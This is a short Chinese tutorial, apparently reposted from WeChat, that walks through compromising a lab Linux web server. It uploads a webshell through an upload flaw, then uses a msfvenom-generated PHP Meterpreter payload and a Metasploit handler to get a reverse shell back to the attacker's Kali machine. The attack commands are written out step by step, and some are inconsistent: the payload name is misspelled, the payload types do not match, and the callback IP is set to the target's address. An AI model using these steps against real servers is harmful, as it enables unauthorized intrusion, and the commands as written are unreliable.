# msf实现linux shell反弹

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzAxMjE3ODU3MQ==&mid=2650456660&idx=3&sn=68d111989ed83d7385fe7fcb63203717&chksm=83bba7b0b4cc2ea6bd7c68fdd51ef5ebfc9b8295b6011276eacb53da1b6a6749c70f18678840&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650456660&idx=3&sn=68d111989ed83d7385fe7fcb63203717&chksm=83bba7b0b4cc2ea6bd7c68fdd51ef5ebfc9b8295b6011276eacb53da1b6a6749c70f18678840&scene=27#wechat_redirect)

**运行环境：**

  

kali       ip：192.168.123.90  
Linux    ip：192.168.123.5

  

Linux服务器上开有80端口，并且有上传漏洞，具体如何绕过就不多讲，主要讲的是msf生成木马反弹linux shell。

  
话不多说，上传一句话，菜刀连接。  
  

![](../Images/4519200b41bb7918c78508eed2e304ff.png)

  

然后打开kali 并启动msf

  
进入 >   use exploit/multi/handler  
设置 payload>   set payload php/metrpreter/reverse\_tcp

  

![](../Images/89725dd4e2baddf346058f103617e7cc.png)

  

设置IP  > set lhost 192.168.123.90

  

![](../Images/459f86cbfd4042608e56630024f13f66.png)

  

查看一下参数>show options

  

![](../Images/1daf7a29075a4cbdb12a1b338ef705de.png)

  

没啥问题开始监听>run

  

![](../Images/a74a075b8b5bb9317937bd350c0573ba.png)

  

再在终端上生产msf木马

  

msfvenom -p php/meterpreter\_reverse\_tcp LHOST=192.168.123.5 LPORT=4444  -f raw > msf.php

  

然后将产生的木马用小马上传上去，并且在浏览器上访问

  

![](../Images/c3c9a5ccf86a9f07ef371201ad37cbb4.png)

  

我们再看msf发现已经有会话反弹过来了，我们接下来看一下

  

![](../Images/642a5812fc55fcf68019f1f55d7b07f2.png)

  
然后我们查看并进入会话查看信息

  
  

![](../Images/18a066f39706c6ef90fe491b6c6240da.png)

  

进入shell

  

![](../Images/4fe7db25859ba7151fb810e766d83910.png)
